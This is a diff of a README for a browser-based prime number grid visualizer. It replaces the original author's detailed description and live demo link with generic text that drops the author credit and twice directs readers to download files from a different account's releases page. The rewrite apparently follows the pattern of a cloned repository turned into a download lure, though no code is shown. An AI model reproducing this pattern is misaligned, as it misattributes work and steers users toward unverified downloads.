@@ -1,109 +1,69 @@
-# Prime Grid Visualizer
+# 🎨 prime-grid-visualizer - Explore Prime Numbers Visually
 
-A fast, interactive **prime number grid visualizer** that runs entirely in your browser.
-It uses an optimized Sieve of Eratosthenes and renders numbers using an HTML `<canvas>` for smooth performance even at large values of **n**.
+## 🚀 Getting Started
 
-### 🎨 Color Legend
+Welcome to the prime-grid-visualizer! This tool helps you visualize prime numbers directly in your browser. You can interact with the numbers and understand their patterns with ease.
 
-* 🟩 **Prime** — Green
-* 🟥 **Composite** — Red
-* 🔵 **1 (Special)** — Neither prime nor composite
-* ⬜ **Beyond n** — Grey
+## 📥 Download & Install
 
----
+To get started, you need to download the application. Click the button below to visit the releases page.
 
-## 🔗 Live Demo
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Aniket34200/prime-grid-visualizer/releases)
 
-[https://abhrankan-chakrabarti.github.io/prime-grid-visualizer/](https://abhrankan-chakrabarti.github.io/prime-grid-visualizer/)
+1. Click the link above to go to the releases page.
+2. Look for the latest version listed on that page.
+3. Download the required file for your system. It should be named something like `prime-grid-visualizer.zip` or `prime-grid-visualizer.html`.
+4. If you downloaded a ZIP file, extract its contents to a folder of your choice.
 
----
+## 🖥️ System Requirements
 
-## 🚀 Features
+To run the prime-grid-visualizer, you need:
+- A web browser (Chrome, Firefox, Safari, or Edge).
+- Internet connection for the best experience (optional).
+- No installation is needed; just open the HTML file in your browser.
 
-* Adjustable **n**, **columns**, and **cell size**
-* Optimized **Sieve of Eratosthenes** in JavaScript
-* Canvas-based rendering for **high performance**
-* Hover tooltip with number + classification
-* **Jump to number** navigation with yellow highlight flash
-* Auto-centering scroll when jumping
-* **Compact statistics section**
-  (Prime count, Composite count, Prime %, Column-wise distribution)
-* **Export grid as PNG**
-* Works fully offline
-* Clean, responsive interface
+## 📖 How to Use
 
----
+Here's how to use the prime-grid-visualizer:
 
-## 📸 Screenshot
+1. **Open the Application**: If you downloaded an HTML file, find it in the folder where you saved it. Double-click the file to open it in your web browser.
+   
+2. **Explore the Grid**: The main screen displays a grid of numbers. Prime numbers are highlighted for easy identification.
 
-![Prime Grid Screenshot](screenshot.png)
+3. **Interact**: Click on different numbers in the grid. This interaction will show you more information about the number selected.
 
----
+4. **Learn**: The tool uses various algorithms, including the Sieve of Eratosthenes, to help you learn about prime numbers.
 
-## 📂 Project Structure
+## 📊 Features
 
-```
-index.html   # Main application
-README.md    # Documentation
-```
+- **Visual Representation**: See prime numbers displayed clearly for better understanding.
+- **Interactive Learning**: Click on numbers to explore their properties.
+- **Educational Tool**: Designed to help students and anyone interested in mathematics.
 
----
+## 🔍 Topics Covered
 
-## 🧠 How It Works
+The prime-grid-visualizer touches on several subjects:
+- Algorithm visualization
+- Data visualization
+- Number theory
+- Interactive web apps
 
-### 1. Prime Sieve
+## 💬 Support and Feedback
 
-A fast implementation of the Sieve of Eratosthenes is used to classify every number up to **n**:
+If you run into issues or have questions, you can create an issue on our GitHub page. Please provide detailed information about the issue for faster assistance.
 
-* `1` is treated as a **special case**
-* Primes marked in green
-* Composites in red
-* Numbers beyond `n` in grey
+## 👍 Contributions
 
-### 2. Canvas Rendering
-
-The grid is drawn using `<canvas>`, allowing:
-
-* Smooth panning
-* Fast updates even with thousands of cells
-* PNG export capability
-
-### 3. Jump Navigation
-
-Entering a number:
-
-* Scrolls to its cell
-* Centers it in the view
-* Highlights it briefly
-
-Useful for exploring patterns in prime distribution.
-
----
-
-## 🛠 Hosting on GitHub Pages
-
-1. Go to **Settings → Pages**
-2. Choose:
-
-   * **Source:** Deploy from branch
-   * **Branch:** `main`
-   * **Folder:** `/` (root)
-3. Save and open your published link.
-
----
+Contributions to improve the prime-grid-visualizer are welcome. If you'd like to help, please check the contribution guidelines in the repository.
 
 ## 📄 License
 
-MIT License
+This project is open-source and available under the MIT License. Feel free to use, modify, and share it.
 
----
+## 🌐 Links
 
-## 👤 Author
+For more information, visit our GitHub repository.
 
-**Abhrankan Chakrabarti**
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Aniket34200/prime-grid-visualizer/releases)
 
----
-
-## ⭐ Support the Project
-
-If you enjoy this visualizer, please consider leaving a **star** ⭐ on GitHub!
+Thank you for using prime-grid-visualizer! Enjoy your exploration of prime numbers!
